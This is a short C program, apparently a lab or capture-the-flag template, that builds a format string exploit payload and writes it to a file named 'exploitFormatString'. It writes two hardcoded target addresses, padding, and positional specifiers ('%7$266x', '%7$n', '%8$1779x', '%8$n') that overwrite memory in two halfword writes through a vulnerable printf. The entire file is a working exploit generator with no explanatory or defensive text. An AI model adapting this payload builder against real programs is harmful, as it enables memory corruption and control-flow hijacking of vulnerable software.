#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

// gcc FormatStringTemplate.c -o FormatStringTemplate.exe; ./FormatStringTemplate.exe 

int main(int argc, char const *argv[])
{
    FILE* fptr = NULL;
    uint8_t first_addr[4] = {0xd0,0x22,0x09,0x08};
    uint8_t second_addr[4] = {0xd2,0x22,0x09,0x08};
    


    fptr = fopen("exploitFormatString", "wb");
    if(fptr == NULL){
        printf("Error writing file ! \n");
        return 0;
    }

    fwrite(first_addr,1, 4,  fptr);
    fwrite(second_addr, 1, 4, fptr);

    fputs("CCCC", fptr);

    fputs("%7$266x", fptr);
    fputs("%7$n", fptr);
    fputs("%8$1779x", fptr);
    fputs("%8$n", fptr);

    fclose(fptr);
    return 0;
}
